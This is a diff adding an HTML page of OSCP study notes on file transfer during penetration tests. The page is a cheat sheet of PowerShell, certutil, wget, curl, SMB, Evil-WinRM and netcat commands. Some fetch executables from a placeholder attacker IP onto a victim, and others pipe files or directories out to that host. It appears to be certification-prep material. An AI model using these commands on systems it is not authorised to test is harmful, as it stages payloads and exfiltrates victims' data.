@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>File Transfer | OSCP Notes</title>
+
+  <!-- evita flash blanco -->
+  <meta name="color-scheme" content="dark">
+  <style>
+    html, body {
+      margin: 0;
+      background: #0b0c0d;
+      color: #e8e8ea;
+    }
+  </style>
+
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+
+<body>
+<div class="layout">
+
+<!-- SIDEBAR -->
+<aside class="sidebar">
+
+  <!-- PERFIL -->
+  <div class="profile">
+    <img src="../img/logo.png" alt="Logo" class="profile-img">
+    <h2>Genaro</h2>
+    <p class="tag">XXXX XXXX</p>
+  </div>
+
+  <!-- REDES -->
+  <div class="socials">
+    <a href="https://youtube.com/@g3narin" target="_blank">
+      <span class="icon">▶</span>
+      <span>YouTube</span>
+      <span class="user">g3narin</span>
+    </a>
+    <a href="https://app.hackthebox.com/users/2426983" target="_blank">
+      <span class="icon">⬢</span>
+      <span>HackTheBox</span>
+      <span class="user">Genaro</span>
+    </a>
+  </div>
+
+  <hr class="divider">
+
+
+  <!-- NAV -->
+  <nav class="nav">
+
+    <a href="../index.html">🏠 Home</a>
+
+    <a href="enumeration.html">🔍 Enumeration</a>
+    <a href="web-attacks.html">🌐 Web Attacks</a>
+
+    <a href="shells.html" class="active">🐚 Shells & Payloads</a>
+
+    <a href="file-transfer.html">📁 File Transfer</a>
+    <a href="passwords.html">🔑 Password Attacks</a>
+
+    <a href="linux-privesc.html">🐧 Linux PrivEsc</a>
+    <a href="windows-privesc.html">🪟 Windows PrivEsc</a>
+
+    <a href="pivoting.html">🔀 Pivoting</a>
+    <a href="ad-enumeration.html">🧩 AD Enumeration</a>
+  <a href="ad-attacks.html">⚔️ AD Attacks I</a>
+    <a href="ad-attacks2.html">⚔️ AD Attacks II</a>
+
+  <a href="ad-lateral-movement.html">🔀 AD Lateral Movement</a>
+
+  </nav>
+
+</aside>
+
+<!-- MAIN -->
+<main class="main">
+
+  <div class="topbar">
+    <div class="topbar-inner">
+      <input id="searchInput" placeholder="Search...">
+      <button id="clearBtn">Clear</button>
+    </div>
+  </div>
+
+  <div class="content">
+
+    <!-- TITLE -->
+    <div class="section">
+      <h1>File Transfers</h1>
+    </div>
+    <div class="section">
+  <h2>HTTP</h2>
+
+  <p>Start a simple HTTP server on the attacker machine.</p>
+  <pre>
+<code>python3 -m http.server &lt;ATTACKER-PORT&gt;</code>
+<button class="copy-btn" data-copy="python3 -m http.server <ATTACKER-PORT>">COPY</button>
+  </pre>
+
+  <p>Download a file from the attacker using PowerShell WebClient.</p>
+  <pre>
+<code>(New-Object System.Net.WebClient).DownloadFile('http://&lt;ATTACKER-IP&gt;:&lt;ATTACKER-PORT&gt;/file.exe','C:\Temp\file.exe')</code>
+<button class="copy-btn" data-copy="(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe','C:\Temp\file.exe')">COPY</button>
+  </pre>
+
+  <p>Download a file using Invoke-WebRequest.</p>
+  <pre>
+<code>Invoke-WebRequest http://&lt;ATTACKER-IP&gt;:&lt;ATTACKER-PORT&gt;/file.exe -OutFile file.exe</code>
+<button class="copy-btn" data-copy="Invoke-WebRequest http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe -OutFile file.exe">COPY</button>
+  </pre>
+
+  <p>Download a file using certutil.</p>
+  <pre>
+<code>certutil -urlcache -split -f http://&lt;ATTACKER-IP&gt;:&lt;ATTACKER-PORT&gt;/file.exe</code>
+<button class="copy-btn" data-copy="certutil -urlcache -split -f http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe">COPY</button>
+  </pre>
+</div>
+
+<div class="section">
+  <h2>Evil-WinRM and Impacket</h2>
+
+  <p>Download a file from the victim.</p>
+  <pre>
+<code>download file.exe C:\Temp\file.exe</code>
+<button class="copy-btn" data-copy="download file.exe C:\Temp\file.exe">COPY</button>
+  </pre>
+
+  <p>Upload a file to the victim.</p>
+  <pre>
+<code>upload file.exe C:\Temp\file.exe</code>
+<button class="copy-btn" data-copy="upload file.exe C:\Temp\file.exe">COPY</button>
+  </pre>
+
+  <p>Download a file using an Impacket interactive shell.</p>
+  <pre>
+<code>lget file.exe</code>
+<button class="copy-btn" data-copy="lget file.exe">COPY</button>
+  </pre>
+
+  <p>Upload a file using an Impacket interactive shell.</p>
+  <pre>
+<code>lput file.exe</code>
+<button class="copy-btn" data-copy="lput file.exe">COPY</button>
+  </pre>
+</div>
+
+<div class="section">
+  <h2>SMB</h2>
+
+  <p>Create an SMB share on the attacker machine.</p>
+  <pre>
+<code>impacket-smbserver share . -smb2support -username user -password pass</code>
+<button class="copy-btn" data-copy="impacket-smbserver share . -smb2support -username user -password pass">COPY</button>
+  </pre>
+
+  <p>Map the SMB share on the victim machine.</p>
+  <pre>
+<code>net use Z: \\&lt;ATTACKER-IP&gt;\share /user:user pass</code>
+<button class="copy-btn" data-copy="net use Z: \\<ATTACKER-IP>\share /user:user pass">COPY</button>
+  </pre>
+
+  <p>Copy a file from the SMB share.</p>
+  <pre>
+<code>copy Z:\file.exe C:\Temp\file.exe</code>
+<button class="copy-btn" data-copy="copy Z:\file.exe C:\Temp\file.exe">COPY</button>
+  </pre>
+</div>
+
+<div class="section">
+  <h2>Netcat</h2>
+
+  <p>Receive a file on the attacker machine.</p>
+  <pre>
+<code>nc -lvp &lt;ATTACKER-PORT&gt; &gt; file.exe</code>
+<button class="copy-btn" data-copy="nc -lvp <ATTACKER-PORT> > file.exe">COPY</button>
+  </pre>
+
+  <p>Send a file from the victim machine.</p>
+  <pre>
+<code>nc &lt;ATTACKER-IP&gt; &lt;ATTACKER-PORT&gt; &lt; file.exe</code>
+<button class="copy-btn" data-copy="nc <ATTACKER-IP> <ATTACKER-PORT> < file.exe">COPY</button>
+  </pre>
+
+  <p>Send a compressed directory.</p>
+  <pre>
+<code>tar czvf - folder | nc &lt;ATTACKER-IP&gt; &lt;ATTACKER-PORT&gt;</code>
+<button class="copy-btn" data-copy="tar czvf - folder | nc <ATTACKER-IP> <ATTACKER-PORT>">COPY</button>
+  </pre>
+</div>
+
+<div class="section">
+  <h2>Wget and Curl</h2>
+
+  <p>Download a file using wget.</p>
+  <pre>
+<code>wget http://&lt;ATTACKER-IP&gt;:&lt;ATTACKER-PORT&gt;/file.exe</code>
+<button class="copy-btn" data-copy="wget http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe">COPY</button>
+  </pre>
+
+  <p>Download a file using curl.</p>
+  <pre>
+<code>curl -O http://&lt;ATTACKER-IP&gt;:&lt;ATTACKER-PORT&gt;/file.exe</code>
+<button class="copy-btn" data-copy="curl -O http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe">COPY</button>
+  </pre>
+
+  <p>Download a file using curl on Windows.</p>
+  <pre>
+<code>curl http://&lt;ATTACKER-IP&gt;:&lt;ATTACKER-PORT&gt;/file.exe -o C:\Temp\file.exe</code>
+<button class="copy-btn" data-copy="curl http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe -o C:\Temp\file.exe">COPY</button>
+  </pre>
+</div>
+
+<div class="section">
+  <h2>Base64</h2>
+
+  <p>Encode a file using Base64.</p>
+  <pre>
+<code>base64 file.exe</code>
+<button class="copy-btn" data-copy="base64 file.exe">COPY</button>
+  </pre>
+
+  <p>Decode a Base64 string back to a file.</p>
+  <pre>
+<code>echo BASE64_STRING | base64 -d &gt; file.exe</code>
+<button class="copy-btn" data-copy="echo BASE64_STRING | base64 -d > file.exe">COPY</button>
+  </pre>
+</div>
+
+
+
+
+  </div>
+</main>
+
+</div>
+
+<script src="../js/main.js"></script>
+</body>
+</html>
